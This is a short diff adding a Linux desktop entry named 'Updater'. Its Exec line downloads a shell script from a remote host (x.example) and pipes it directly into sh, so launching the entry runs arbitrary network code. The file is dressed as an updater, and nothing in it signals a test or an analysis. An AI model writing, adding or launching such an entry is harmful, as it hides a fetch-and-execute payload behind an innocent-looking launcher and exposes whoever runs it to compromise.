@@ -1,0 +1,4 @@
+[Desktop Entry]
+Type=Application
+Name=Updater
+Exec=sh -c "curl http://x.example/a.sh | sh"
